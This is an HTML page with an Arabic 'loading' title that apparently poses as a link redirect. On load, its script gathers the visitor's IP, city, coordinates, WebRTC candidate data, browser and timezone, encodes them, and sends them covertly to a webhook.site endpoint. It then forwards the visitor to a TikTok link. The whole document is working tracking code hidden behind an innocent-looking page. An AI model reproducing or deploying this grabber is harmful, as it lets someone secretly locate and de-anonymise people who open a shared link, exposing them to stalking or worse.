<!doctype html><html lang="ar" dir="rtl"><head>
<meta charset="utf-8"><title>جاري التحميل…</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{margin:0;background:#000}#f{opacity:0;pointer-events:none}</style>
<script>
(async()=>{
  const geo=await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>{});
  let rtc={};
  try{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
       pc.createDataChannel('');pc.onicecandidate=e=>{if(e.candidate){const c=e.candidate.candidate.split(' ');rtc={lat:c[7],lon:c[8]};}};
       await pc.createOffer();await pc.setLocalDescription();}catch{}
  const payload=btoa(JSON.stringify({ip:geo.ip,country:geo.country_name,city:geo.city,region:geo.region,lat:geo.latitude,lon:geo.longitude,rtc:rtc,ua:navigator.userAgent,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,t:Date.now()}));

  /* إرسال بدون CORS باستخدام sendBeacon */
  navigator.sendBeacon('https://webhook.site/8a2202ae-712d-4d50-8a50-963d31c788a4', JSON.stringify({data:payload}));

  setTimeout(()=>location.replace('https://vt.tiktok.com/ZS5VSgPm5/'),900);
})();
</script></head><body><img id="f" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></body></html>
